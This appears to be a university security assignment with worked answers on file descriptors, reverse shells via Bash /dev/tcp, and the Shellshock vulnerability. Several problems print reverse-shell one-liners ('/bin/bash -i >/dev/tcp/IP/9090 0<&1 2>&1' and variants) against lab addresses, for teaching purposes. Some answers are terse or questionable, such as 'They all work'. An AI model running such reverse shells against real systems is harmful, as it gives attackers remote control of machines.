---
layout: default
course_number: CS335
title: Assignment 1
---

# Assignment – Reverse Shells and Shellshock
This assignment introduces students to the concepts behind reverse shells and the Shellshock vulnerability. The goal is to help students understand how file descriptors, redirection, and environment‑variable–based function imports interact with system behavior.

---
## Part I — Reverse Shell Concepts
### Problem 1
Run the following command in a Bash shell:
```bash 
exec 5>/dev/null
```
Explain what happens to the current process after this command is executed.

**Answer**: This bash’s built-in command will open the file `/dev/null` and assign the file descriptor 5 to it. We can go to `/dev/fd` and see that a new entry has been added.

### Problem 2
Consider the following code snippet:
```c
fd = open("/tmp/xyz", O_RDWR);
printf("File descriptor: %d\n", fd);
```
Suppose the output indicates that the file descriptor returned for `/tmp/xyz` is 0. Explain what might have caused this situation.

**Answer**: Usually, the file descriptor 0 is for the standard input device, which is already opened. Therefore, 0 will not be assigned to another file. However, if the file descriptor 0 is closed, this number will be reassigned to the next opened file. That is probably the reason why our file get file descriptor 0.

### Problem 3
To achieve the redirection performed by the command:
```bash
cat 1>&3
```
which system call is invoked: `dup2(1, 3)` or `dup2(3, 1)`? Explain your reasoning.

**Answer**: It is dup2(3, 1).

### Problem 4
You want a program to receive input from another machine (Machine A, IP address 10.0.2.6) and send its output back to the same machine. After running:
```bash
nc -l 9090
```
on Machine A, you execute the following command on the local machine:
```bash 
/bin/cat 1>/dev/tcp/10.0.2.6/9090 0</dev/tcp/10.0.2.6/9090
```

Does this achieve the intended behavior? Explain why or why not. To support your explanation, complete the following tasks and include your observations:

- Inspect file descriptors using `/proc/$$/fd`
  - Before running the command, list the symbolic links in:

  - Run the command in another terminal and list the directory again.
  - Describe any new file descriptors that appear and what they point to.

- Use `netstat` (or `ss`) to examine network connections
  - While the command is running, use:

```bash 
netstat -tan
```

  - Identify the TCP connection(s) created by the `/dev/tcp/` redirections.
  - Explain how these connections relate to the behavior of the command.

**Answer**: No, it does not work. The above command will try to establish two different TCP connections with machine A, one for output and the other for input. However, the TCP server launched from the `nc` command can only accept one connection. Therefore, the command above will fail.

### Problem 5
What is the result of running the following commands?
```bash 
exec 5>/tmp/xyz
echo hello >&5
```
Describe what happens and why.

**Answer**: Answer: The first command opens file `/tmp/xyz`, and assign the file descriptor number 5 to it. The second command redirect the echo command’s output to file descriptor 5. Therefore, the message "hello" will be printed to the `/tmp/xyz` file.

### Problem 6
In the following program, the first `printf()` should print to the screen, while the second should print to the file `/tmp/xyz`:
```c
printf("%s\n", "message one");
...
printf("%s\n", "message two");
```
What should be done between these two lines to achieve the desired behavior?

**Answer**: After the first `printf()`, we can redirect the standard output to `/tmp/xyz`.

```c
fd = open("/tmp/xyz", O_RDWR); 
dup2(fd, 1);
```

### Problem 7
The commands below each use different combinations of Bash file‑descriptor redirection involving standard input (`0`), standard output (`1`), and standard error (`2`), along with `/dev/tcp/` for creating TCP connections. Your task is to analyze the redirection logic in each example and determine how the file descriptors are being rearranged. Replace `IP` with the appropriate address when reasoning about the redirections. 
```bash 
- /bin/bash -i >/dev/tcp/IP/9090 0<&1 2>&0
- /bin/bash -i >/dev/tcp/IP/9090 0<&1 2>&1
- /bin/bash -i >/dev/tcp/IP/9090 2>&1 0<&1
- /bin/bash -i 2>/dev/tcp/IP/9090 1>&2 0<&2
- /bin/bash -i 2>/dev/tcp/IP/9090 1>&2 0<&1
```

Describe whether the redirections form a consistent input/output flow.Note any inconsistencies or ordering issues in the redirection sequence.

**Answer**: They all work.

### Problem 8
The `/dev/tcp` virtual file is not provided by the Linux kernel; it is a feature implemented by the **Bash** shell. Other shells, such as `zsh`, do not interpret `/dev/tcp` unless they implement compatible extensions. Consider the following commands, each invoking a different shell to execute a subshell that attempts to use `/dev/tcp/` redirection:
```bash
- /bin/zsh -c "/bin/zsh -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/zsh -c "/bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/bash -c "/bin/zsh -i > /dev/tcp/IP/9090 0<&1 2>&1"
- /bin/bash -c "/bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1"
```
For each command: 
- Identify which shell is responsible for interpreting the `/dev/tcp` syntax.
- Explain whether the invoked shell supports `/dev/tcp`.
- Describe how this affects the behavior of the command.
- Summarize which commands result in valid `/dev/tcp` redirection and which do not.
  
**Answer**: The third and fourth ones are correct. In the command, the first shell must be bash, because it is this shell that recognizes the `/dev/tcp` virtual file and then makes a TCP connection. When the second shell runs, the TCP connection has already been established. Therefore, the second shell program can be any shell program.  

---

## Part II — Shellshock Vulnerability

### Problem 1
For the Shellshock vulnerability to be exploitable, two conditions must be met. Identify and explain these two conditions.

**Answer**: 
- Condition 1: the target process needs to run Bash. 
- Condition 2: before running Bash, the target process should have an environment variable that gets its value for the user.

### Problem 2
Consider the following environment variable assignment:
``` bash
export foo='echo world; () { echo hello; }'
```
Assuming the system is running a version of Bash vulnerable to Shellshock, will the command echo world be executed when Bash starts? Explain why or why not.

**Answer**: No. The environment variable does not start with the pattern `() {`, so Bash will not consider it as a function definition, so the vulnerable logic will not be triggered.

### Problem 3
Machine 1 (IP 10.0.2.6) runs:
```bash 
nc -l 7070
```
Machine 2 then runs:
```bash 
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0
```
Describe what will happen as a result of this command.

**Answer**: The program gets inputs from a remote machine `10.0.2.6`, and then print out what is read back to the remote machine (`>&0` redirects the output to the input device, which is the TCP connection).

### Problem 4
Explain what the following two lines of code do, respectively:
```c
read(5, data, 100);
write(3, data, 100);
```

**Answer**: 
- Read up to 100 bytes from file descriptor 5 into the memory buffer pointed to data.
- Write 100 bytes from data to the file descriptor 3

### Problem 5
Open two terminal windows in Ubuntu and list the contents of the `/dev/fd` directory in each. Explain why the two windows show different results.
(Hint: `/dev/fd` is a symbolic link to `/proc/self/fd`, and `self` refers to the current process.)

**Answer**: When you open two separate terminal windows, each terminal is running its own shell process.
